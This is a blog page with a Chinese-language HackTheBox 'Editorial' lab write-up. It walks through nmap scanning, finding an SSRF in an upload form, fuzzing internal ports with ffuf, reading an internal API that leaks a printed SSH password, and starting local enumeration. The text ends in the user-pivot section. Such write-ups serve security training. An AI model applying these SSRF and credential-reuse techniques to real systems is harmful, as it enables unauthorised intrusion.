@@ -1,0 +1,687 @@
+<!DOCTYPE html>
+<html itemscope itemtype="http://schema.org/WebPage" lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+    <meta name="robots" content="noodp" />
+    <title>HackTheBox Editorial Writeup - L1nq Blog</title><meta name="author" content="L1nq">
+<meta name="description" content="HackTheBox Editorial Writeup"><meta name="keywords" content='HackTheBox'>
+  <meta itemprop="name" content="HackTheBox Editorial Writeup">
+  <meta itemprop="description" content="HackTheBox Editorial Writeup">
+  <meta itemprop="datePublished" content="2025-03-05T19:07:23+00:00">
+  <meta itemprop="dateModified" content="2026-07-09T18:38:23+08:00">
+  <meta itemprop="wordCount" content="1027">
+  <meta itemprop="image" content="https://sw1mblu3.fun/1.jpg">
+  <meta itemprop="keywords" content="HackTheBox"><meta property="og:url" content="https://sw1mblu3.fun/posts/hackthebox-editorial/">
+  <meta property="og:site_name" content="L1nq Blog">
+  <meta property="og:title" content="HackTheBox Editorial Writeup">
+  <meta property="og:description" content="HackTheBox Editorial Writeup">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-03-05T19:07:23+00:00">
+    <meta property="article:modified_time" content="2026-07-09T18:38:23+08:00">
+    <meta property="article:tag" content="HackTheBox">
+    <meta property="og:image" content="https://sw1mblu3.fun/1.jpg">
+<meta name="twitter:card" content="summary" /><meta name="twitter:site" content="@L1nq1_" />
+  <meta name="twitter:creator" content="@L1nq1_" /><meta name="twitter:image" content="https://sw1mblu3.fun/1.jpg" /><meta name="twitter:title" content="HackTheBox Editorial Writeup" /><meta name="twitter:description" content="HackTheBox Editorial Writeup" /><meta name="application-name" content="L1nq Blog">
+<meta name="apple-mobile-web-app-title" content="L1nq Blog"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" type="text/html" href="https://sw1mblu3.fun/posts/hackthebox-editorial/" title="HackTheBox Editorial Writeup - L1nq Blog" /><link rel="prev" type="text/html" href="https://sw1mblu3.fun/posts/cslab-lab1-7/" title="Cyberstrikelab lab1-7 Writeup" /><link rel="next" type="text/html" href="https://sw1mblu3.fun/posts/hackthebox-escapetwo/" title="HackTheBox EscapeTwo Writeup" /><link rel="alternate" type="text/markdown" href="https://sw1mblu3.fun/posts/hackthebox-editorial/index.md" title="HackTheBox Editorial Writeup - L1nq Blog"><link rel="stylesheet" href="/css/config.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "headline": "HackTheBox Editorial Writeup",
+    "inLanguage": "en",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "https:\/\/sw1mblu3.fun\/posts\/hackthebox-editorial\/"
+    },"image": ["https:\/\/sw1mblu3.fun\/1.jpg"],"genre": "posts","keywords": "HackTheBox","wordcount":  1027 ,
+    "url": "https:\/\/sw1mblu3.fun\/posts\/hackthebox-editorial\/","datePublished": "2025-03-05T19:07:23+00:00","dateModified": "2026-07-09T18:38:23+08:00","license": "2026","publisher": {
+      "@type": "Organization",
+      "name": "L1nq Blog","logo": "https:\/\/sw1mblu3.fun\/1.jpg"},"author": {
+        "@type": "Person",
+        "name": "L1nq"
+      },"description": ""
+  }
+  </script><script src="/js/head/color-scheme.min.js"></script><meta name="view-transition" content="same-origin">
+<script>
+(function() {
+  
+  var hasNative = false;
+  try {
+    if (typeof CSS !== 'undefined' && CSS.supports) {
+      hasNative = CSS.supports('selector(::view-transition-old(root))');
+    }
+  } catch(e) {}
+  if (hasNative) return;
+
+  
+  document.addEventListener('click', function(e) {
+    var a = (e.target && e.target.closest) ? e.target.closest('a') : null;
+    if (!a || !a.href) return;
+    var url;
+    try { url = new URL(a.href, location.href); } catch(e) { return; }
+    if (url.origin !== location.origin) return;
+    if (a.target && a.target === '_blank') return;
+    if (a.hasAttribute && a.hasAttribute('download')) return;
+    if (e.metaKey || e.ctrlKey || e.altKey || e.shiftKey) return;
+
+    e.preventDefault();
+    try { sessionStorage.setItem('_vt', '1'); } catch(e) {}
+    document.documentElement.style.opacity = '0';
+    document.documentElement.style.transition = 'opacity 0.12s ease-out';
+    setTimeout(function() { location.href = a.href; }, 120);
+  }, { capture: true });
+
+  
+  try {
+    if (sessionStorage.getItem('_vt') === '1') {
+      sessionStorage.removeItem('_vt');
+      document.documentElement.style.opacity = '0';
+      document.documentElement.style.transition = 'none';
+      requestAnimationFrame(function() {
+        requestAnimationFrame(function() {
+          document.documentElement.style.transition = 'opacity 0.2s ease-in';
+          document.documentElement.style.opacity = '1';
+        });
+      });
+    }
+  } catch(e) {}
+})();
+</script>
+</head>
+  <body data-instant-intensity="viewport" data-header-desktop="sticky" data-header-mobile="auto">
+    <div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
+  <div class="header-wrapper">
+    <div class="header-title">
+      <a href="/" title="L1nq Blog"><span class="header-title-text">L1nq Blog</span></a><span class="header-subtitle"></span></div>
+    <nav>
+      <ul class="menu"><li class="menu-item">
+              <a class="menu-link" href="/categories/"><i class="fa-solid fa-folder-tree fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item">
+              <a class="menu-link" href="/tags/"><i class="fa-solid fa-tags fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item">
+              <a class="menu-link" href="/links/"><i class="fa-solid fa-link fa-sm" aria-hidden="true"></i> Links</a></li><li class="menu-item">
+              <a class="menu-link" href="/about/"><i class="fa-solid fa-user fa-sm" aria-hidden="true"></i> About</a></li><li class="menu-item">
+              <a class="menu-link" href="/archives/"><i class="fa-solid fa-archive fa-sm" aria-hidden="true"></i> Archives</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id="search-desktop">
+            <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+            <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+              <i class="fa-solid fa-search" aria-hidden="true"></i>
+            </a>
+            <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+              <i class="fa-solid fa-times-circle" aria-hidden="true"></i>
+            </a>
+            <span class="search-button search-loading" id="search-loading-desktop">
+              <i class="fa-solid fa-spinner fa-spin" aria-hidden="true"></i>
+            </span>
+          </li><li class="menu-item theme-switch" role="button" aria-label="Switch Theme" title="Switch Theme"><i class="fa-solid fa-adjust" aria-hidden="true"></i></li></ul>
+    </nav>
+  </div>
+</header><header class="mobile animate__faster" id="header-mobile">
+  <div class="header-container">
+    <div class="header-wrapper">
+      <div class="header-title">
+        <a href="/" title="L1nq Blog"><span class="header-title-text">L1nq Blog</span></a><span class="header-subtitle"></span></div>
+      <div class="theme-switch" role="button" aria-label="Switch Theme"><i class="fa-solid fa-adjust" aria-hidden="true"></i></div>
+      <div class="menu-toggle" id="menu-toggle-mobile" role="button" aria-labelledby="menu-mobile">
+        <span></span><span></span><span></span>
+      </div>
+    </div>
+    <nav>
+      <ul class="menu" id="menu-mobile"><li class="search-wrapper">
+            <div class="search mobile" id="search-mobile">
+              <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+              <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                <i class="fa-solid fa-search" aria-hidden="true"></i>
+              </a>
+              <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                <i class="fa-solid fa-times-circle" aria-hidden="true"></i>
+              </a>
+              <span class="search-button search-loading" id="search-loading-mobile">
+                <i class="fa-solid fa-spinner fa-spin" aria-hidden="true"></i>
+              </span>
+            </div>
+            <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+              Cancel
+            </a>
+          </li><li class="menu-item"><a class="menu-link" href="/categories/"><i class="fa-solid fa-folder-tree fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item"><a class="menu-link" href="/tags/"><i class="fa-solid fa-tags fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item"><a class="menu-link" href="/links/"><i class="fa-solid fa-link fa-sm" aria-hidden="true"></i> Links</a></li><li class="menu-item"><a class="menu-link" href="/about/"><i class="fa-solid fa-user fa-sm" aria-hidden="true"></i> About</a></li><li class="menu-item"><a class="menu-link" href="/archives/"><i class="fa-solid fa-archive fa-sm" aria-hidden="true"></i> Archives</a></li><li class="menu-item menu-system"></li>
+      </ul>
+    </nav>
+  </div>
+</header><div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+  </div>
+  <div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+  </div><main class="fi-container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="Collections"></aside>
+
+  <article class="page single">
+    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span>HackTheBox Editorial Writeup</span>
+      </h1></div><div class="post-meta">
+      <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="meta-calendar-icon">
+        <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+        <path d="M4 7a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v12a2 2 0 0 1 -2 2h-12a2 2 0 0 1 -2 -2v-12z"/>
+        <path d="M16 3v4"/><path d="M8 3v4"/><path d="M4 11h16"/>
+        <path d="M7 14h.013"/><path d="M10.01 14h.005"/><path d="M13.01 14h.005"/><path d="M16.015 14h.005"/>
+        <path d="M13.015 17h.005"/><path d="M7.01 17h.005"/><path d="M10.01 17h.005"/>
+      </svg><time datetime="2025-03-05T19:07:23Z">5 Mar, 2025</time><span aria-hidden="true">|</span>
+        <a href="true" target="_blank" rel="noopener noreferrer">Edit this page</a></div><div class="details toc" id="toc-static" data-kept="false">
+        <div class="details-summary toc-title">
+          <span>Contents</span>
+          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
+        </div>
+        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#外网信息探测">外网信息探测</a></li>
+    <li><a href="#ssrf内部端口识别">SSRF内部端口识别</a>
+      <ul>
+        <li><a href="#api端点信息获取">API端点信息获取</a></li>
+      </ul>
+    </li>
+    <li><a href="#dev---prod-用户移动">dev -&gt; prod 用户移动</a>
+      <ul>
+        <li><a href="#内网信息收集">内网信息收集</a></li>
+        <li><a href="#git-历史记录敏感信息收集">Git 历史记录敏感信息收集</a></li>
+      </ul>
+    </li>
+    <li><a href="#root-权限提升">Root 权限提升</a></li>
+  </ul>
+</nav></div>
+      </div><div class="content" id="content"><p>HackTheBox Editorial Writeup</p>
+<h1 class="heading-element" id="外网信息探测"><span>外网信息探测</span>
+  <a href="#%e5%a4%96%e7%bd%91%e4%bf%a1%e6%81%af%e6%8e%a2%e6%b5%8b" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h1><p><strong>Nmap 服务探测</strong></p>
+<p>目标IP 10.10.11.20</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="2" style="--fi-max-shown-lines:30;--fi-line-digit:2;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">┌──(mighty㉿kali)-[~]
+</span></span><span class="line"><span class="cl">└─$ sudo nmap -n -Pn -sS -p- --min-rate 10000 10.10.11.20
+</span></span><span class="line"><span class="cl">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-21 18:28 CST
+</span></span><span class="line"><span class="cl">Nmap scan report for 10.10.11.20
+</span></span><span class="line"><span class="cl">Host is up (0.48s latency).
+</span></span><span class="line"><span class="cl">Not shown: 65533 closed tcp ports (reset)
+</span></span><span class="line"><span class="cl">PORT STATE SERVICE
+</span></span><span class="line"><span class="cl">22/tcp open ssh
+</span></span><span class="line"><span class="cl">80/tcp open http
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">┌──(mighty㉿kali)-[~]
+</span></span><span class="line"><span class="cl">└─$ sudo nmap -sV -Pn -A -p22,80 10.10.11.20
+</span></span><span class="line"><span class="cl">PORT STATE SERVICE VERSION
+</span></span><span class="line"><span class="cl">22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)
+</span></span><span class="line"><span class="cl">| ssh-hostkey: 
+</span></span><span class="line"><span class="cl">| 256 0d:ed:b2:9c:e2:53:fb:d4:c8:c1:19:6e:75:80:d8:64 (ECDSA)
+</span></span><span class="line"><span class="cl">|_ 256 0f:b9:a7:51:0e:00:d5:7b:5b:7c:5f:bf:2b:ed:53:a0 (ED25519)
+</span></span><span class="line"><span class="cl">80/tcp open http nginx 1.18.0 (Ubuntu)
+</span></span><span class="line"><span class="cl">|_http-server-header: nginx/1.18.0 (Ubuntu)
+</span></span><span class="line"><span class="cl">|_http-title: Did not follow redirect to http://editorial.htb</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p>Nmap 的扫描结果显示 <code>http://editorial.htb</code>，将目标暴露的域名添加至域名解析。</p>
+<p><strong>Web 服务测试</strong></p>
+<p>访问 <code>http://editorial.htb</code>，首页是一个静态页面，并没有提供任何可交互功能。点击首页第二标签键会跳转到 /upload 页面，这个接口提供了 URL与文件上传两个敏感点</p>
+<p><figure>
+  <img src="image-20241021213918249.png" alt="image-20241021213918249" loading="lazy"></figure>
+</p>
+<p>目标并不出网，我们需要给对方一个可访问到的 URL 来测试是否存在 SSRF，于是我在本地监听 7788 端口，将表单信息改为本地 IP 并点击预览，发现本地真的接收到了目标发送的 HTTP 连接请求。</p>
+<p><figure>
+  <img src="image-20241021212839106.png" alt="image-20241021212839106" loading="lazy"></figure>
+</p>
+<p><figure>
+  <img src="image-20241021212540182.png" alt="" loading="lazy"></figure>
+</p>
+<p>如果我在本地开启 Web 服务，并提供 image.png 图片，目标会读取图片， 同时网页也能够预览该图片</p>
+<p>这也说明了这个功能点的逻辑是提供一个在线图片网址，服务器就会访问并下载，至于图片会存储多久，也许一直存储在本地，也许预览完就会清理掉。</p>
+<p><figure>
+  <img src="image-20241021213912229.png" alt="image-20241021213912229" loading="lazy"></figure>
+</p>
+<p>BurpSuite 抓包，还能够发现返回包中有图片存储本地路径的信息</p>
+<p><figure>
+  <img src="image-20241021214406645.png" alt="image-20241021214406645" loading="lazy"></figure>
+</p>
+<p>当我不提供任何图片时，直接让目标访问我的Web 服务根目录，看到对方直接就读取了根目录列表并存在返回的文件中</p>
+<p><figure>
+  <img src="image-20241021214926014.png" alt="image-20241021214926014" loading="lazy"></figure>
+</p>
+<p>假如我填写的是 127.0.0.1，让服务器访问自己本地网站，显示如下</p>
+<p><figure>
+  <img src="image-20241021212558110.png" alt="image-20241021212558110" loading="lazy"></figure>
+</p>
+<p>这不就是这张图片？</p>
+<p><figure>
+  <img src="image-20250313204314148.png" alt="image-20250313204314148" loading="lazy"></figure>
+</p>
+<p>通过这个接口，目标可以读取任何有效的 URL 内容，乃至本地的资源，很显然这是经典且熟知的漏洞 - SSRF</p>
+<h1 class="heading-element" id="ssrf内部端口识别"><span>SSRF内部端口识别</span>
+  <a href="#ssrf%e5%86%85%e9%83%a8%e7%ab%af%e5%8f%a3%e8%af%86%e5%88%ab" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h1><p>通过该程序提供的 HTTP 请求功能，我尝试判断是否存在<strong>本地无法访问的服务端口</strong></p>
+<p>首先将表单信息改为127.0.0.1，端口改为80、22，这是已知的两个端口，分别提交。80端口等待了长时间才返回结果，而22端口立刻就返回了结果，结果都是回显之前的空白图片</p>
+<p><figure>
+  <img src="image-20241021215635729.png" alt="image-20241021215635729" loading="lazy"></figure>
+</p>
+<p><figure>
+  <img src="image-20241021215803803.png" alt="image-20241021215803803" loading="lazy"></figure>
+</p>
+<p><figure>
+  <img src="image-20241021215751200.png" alt="image-20241021215751200" loading="lazy"></figure>
+</p>
+<p>我再次尝试请求一个不存在的端口</p>
+<p><figure>
+  <img src="image-20241022095339258.png" alt="image-20241022095339258" loading="lazy"></figure>
+</p>
+<p>和22端口一样很快的返回了结果，同样是之前的空白图片</p>
+<p><figure>
+  <img src="image-20241022095356826.png" alt="" loading="lazy"></figure>
+</p>
+<p><strong>接下来我尝试枚举所有端口。</strong></p>
+<p>SSRF fuzz 工具选择可以是 BurpSuite，也可以是其他模糊测试工具，这里我选择 ffuf</p>
+<p>将 HTTP 请求体中需要替换的内容使用占位符FUZZ替代，并保存在 requests.txt</p>
+<p><figure>
+  <img src="image-20241021222128775.png" alt="" loading="lazy"></figure>
+</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">ffuf -u http://editorial.htb/upload-cover -request ssrf.request -w &lt;(seq 0 65535) -ac</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p>扫描完毕，结果显示 5000</p>
+<p><figure>
+  <img src="image-20241022101049760.png" alt="image-20241022101049760" loading="lazy"></figure>
+</p>
+<p>5000 端口与其他已经确认的未开放端口的状态码等结果有所不同，这非常有理由怀疑其内部开放。我填写表单直接请求 5000 端口，服务器返回的确是不同的结果</p>
+<p><figure>
+  <img src="image-20241022095746155.png" alt="image-20241022095746155" loading="lazy"></figure>
+</p>
+<p><figure>
+  <img src="image-20250313205537213.png" alt="image-20250313205537213" loading="lazy"></figure>
+</p>
+<p>返回的路径下载到了一个文本文件。缓存时间比较短暂，是因为有一个自动清理的脚本在运行</p>
+<p><figure>
+  <img src="image-20241022101125499.png" alt="image-20241022101125499" loading="lazy"></figure>
+</p>
+<p>将文本进行 Json 格式化</p>
+<p><figure>
+  <img src="image-20241022102238058.png" alt="image-20241022102238058" loading="lazy"></figure>
+</p>
+<p>根据 Json 信息及之前的一些信息，推测它可能在运行基于 Flask 构建的 Web API 应用。这个应用负责处理 HTTP 请求，并响应 JSON 格式的数据，用于处理和管理用户、版本更新等信息，<strong>接下来我尝试去抓取这些API端点信息</strong></p>
+<h2 class="heading-element" id="api端点信息获取"><span>API端点信息获取</span>
+  <a href="#api%e7%ab%af%e7%82%b9%e4%bf%a1%e6%81%af%e8%8e%b7%e5%8f%96" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>依次填写表单请求各个API ，随后获取返回的文本文件</p>
+<p>http://127.0.0.1:5000/api/latest/metadata/messages/coupons</p>
+<p><figure>
+  <img src="image-20241022104448557.png" alt="image-20241022104448557" loading="lazy"></figure>
+</p>
+<p>/api/latest/metadata/messages/authors</p>
+<p><figure>
+  <img src="image-20241022105709117.png" alt="image-20241022105709117" loading="lazy"></figure>
+</p>
+<p>/api/latest/metadata/changelog</p>
+<p><figure>
+  <img src="image-20241022110151574.png" alt="image-20241022110151574" loading="lazy"></figure>
+</p>
+<p>在 authors 的 JSON 文本中，发现账户密码泄露</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">dev/dev080217_devAPI!@</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p>使用 SSH 尝试连接，登录成功</p>
+<p><figure>
+  <img src="image-20241022110453419.png" alt="image-20241022110453419" loading="lazy"></figure>
+</p>
+<h1 class="heading-element" id="dev---prod-用户移动"><span>dev -&gt; prod 用户移动</span>
+  <a href="#dev---prod-%e7%94%a8%e6%88%b7%e7%a7%bb%e5%8a%a8" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h1><h2 class="heading-element" id="内网信息收集"><span>内网信息收集</span>
+  <a href="#%e5%86%85%e7%bd%91%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p><strong>先进行内网信息收集</strong></p>
+<p>看用户权限列表</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">dev@editorial:~$ sudo -l
+</span></span><span class="line"><span class="cl"><span class="o">[</span>sudo<span class="o">]</span> password <span class="k">for</span> dev: 
+</span></span><span class="line"><span class="cl">Sorry, user dev may not run sudo on editorial.</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p>列出 SUID 文件，并没有可利用提权的文件</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="2" style="--fi-max-shown-lines:30;--fi-line-digit:2;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">dev@editorial:~$ find / -perm -4000 2&gt;/dev/null
+</span></span><span class="line"><span class="cl">/usr/lib/openssh/ssh-keysign
+</span></span><span class="line"><span class="cl">/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+</span></span><span class="line"><span class="cl">/usr/libexec/polkit-agent-helper-1
+</span></span><span class="line"><span class="cl">/usr/bin/chsh
+</span></span><span class="line"><span class="cl">/usr/bin/fusermount3
+</span></span><span class="line"><span class="cl">/usr/bin/sudo
+</span></span><span class="line"><span class="cl">/usr/bin/umount
+</span></span><span class="line"><span class="cl">/usr/bin/mount
+</span></span><span class="line"><span class="cl">/usr/bin/newgrp
+</span></span><span class="line"><span class="cl">/usr/bin/gpasswd
+</span></span><span class="line"><span class="cl">/usr/bin/passwd
+</span></span><span class="line"><span class="cl">/usr/bin/chfn
+</span></span><span class="line"><span class="cl">/usr/bin/su</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p>系统下存在两个用户，dev、prod</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="2" style="--fi-max-shown-lines:30;--fi-line-digit:2;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">dev@editorial:~$ <span class="nb">cd</span> /home
+</span></span><span class="line"><span class="cl">dev@editorial:/home$ ls
+</span></span><span class="line"><span class="cl">dev  prod
+</span></span><span class="line"><span class="cl">dev@editorial:/home$ ls -liah
+</span></span><span class="line"><span class="cl">total 16K
+</span></span><span class="line"><span class="cl"><span class="m">76438</span> drwxr-xr-x  <span class="m">4</span> root root 4.0K Jun  <span class="m">5</span> 14:36 .
+</span></span><span class="line"><span class="cl">    <span class="m">2</span> drwxr-xr-x <span class="m">18</span> root root 4.0K Jun  <span class="m">5</span> 14:54 ..
+</span></span><span class="line"><span class="cl"><span class="m">79764</span> drwxr-x---  <span class="m">4</span> dev  dev  4.0K Oct <span class="m">22</span> 06:52 dev
+</span></span><span class="line"><span class="cl"><span class="m">77643</span> drwxr-x---  <span class="m">5</span> prod prod 4.0K Jun  <span class="m">5</span> 14:36 prod</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p>我传入 pspy64 监控定时任务，发现服务器定时执行 clear.sh 脚本清理 <code>/static/uploads/.</code> 目录，这也对应了前面调用服务器发送 HTTP 请求读取信息，一会缓存就没了的情况。</p>
+<p><figure>
+  <img src="image-20241022115252379.png" alt="image-20241022115252379" loading="lazy"></figure>
+</p>
